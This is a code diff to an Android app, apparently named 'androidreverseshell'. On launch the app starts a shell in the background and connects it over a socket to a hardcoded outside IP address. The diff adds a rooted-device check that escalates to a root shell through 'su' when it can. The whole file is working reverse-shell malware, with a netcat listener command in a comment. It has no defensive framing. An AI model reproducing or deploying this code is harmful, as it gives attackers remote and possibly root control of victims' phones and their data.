@@ -1,5 +1,6 @@
 package com.example.androidreverseshell;
 
+import java.io.File;
 import java.io.IOException;
 import java.io.InputStream;
 import java.io.OutputStream;
@@ -20,16 +21,16 @@ public class MainActivity extends Activity {
 		getMenuInflater().inflate(R.menu.activity_main, menu);
 		return true;
 	}
-	
+
 	@Override
 	public void onCreate(Bundle savedInstanceState) {
 		super.onCreate(savedInstanceState);
 		text = new TextView(this);
 		setContentView(text);
 		text.setText("Reverse Shell");
-		
+
 		// start a reverse shell in the background
-		new Thread(new Runnable(){
+		new Thread(new Runnable() {
 			@Override
 			public void run() {
 				try {
@@ -38,22 +39,29 @@ public class MainActivity extends Activity {
 					Log.e("Reverse Shell Error", e.getMessage());
 				}
 			}
-			
+
 		}).start();
 	}
 
 	public void reverseShell() throws Exception {
 		// could check to see if device is rooted
 		// https://stackoverflow.com/questions/1101380/determine-if-running-on-a-rooted-device
-		// final Process process = Runtime.getRuntime().exec(new String[]{"su", "-c", "system/bin/sh"}); // use if phone is rooted to get root shell...
-		
+		// final Process process = Runtime.getRuntime().exec(new String[]{"su",
+		// "-c", "system/bin/sh"}); // use if phone is rooted to get root
+		// shell...
+
 		// create a process around the shell
-		final Process process = Runtime.getRuntime().exec("system/bin/sh");
+		final Process process;
+		if (isDeviceRooted()) {
+			process = Runtime.getRuntime().exec(new String[] { "su", "-c", "system/bin/sh" });
+		} else {
+			process = Runtime.getRuntime().exec("system/bin/sh");
+		}
 
 		// start a socket
 		@SuppressWarnings("resource")
 		Socket socket = new Socket("65.110.233.191", 444);
-		
+
 		// server should be listen on port 4444
 		// Netcat Example: nc -l -p 4444
 
@@ -67,8 +75,7 @@ public class MainActivity extends Activity {
 		socket.getInputStream().close();
 		socket.getOutputStream().close();
 	}
-	
-	
+
 	private static void forwardStream(final InputStream input, final OutputStream output) {
 		new Thread(new Runnable() {
 			@Override
@@ -96,6 +103,22 @@ public class MainActivity extends Activity {
 				}
 			}
 		}).start();
+	}
+
+	// http://stackoverflow.com/questions/19288463/how-to-check-if-android-phone-is-rooted
+	public static boolean isDeviceRooted() {
+		boolean found = false;
+		if (!found) {
+			String[] places = { "/sbin/", "/system/bin/", "/system/xbin/", "/data/local/xbin/", "/data/local/bin/",
+					"/system/sd/xbin/", "/system/bin/failsafe/", "/data/local/" };
+			for (String where : places) {
+				if (new File(where + "su").exists()) {
+					found = true;
+					break;
+				}
+			}
+		}
+		return found;
 	}
 
 }
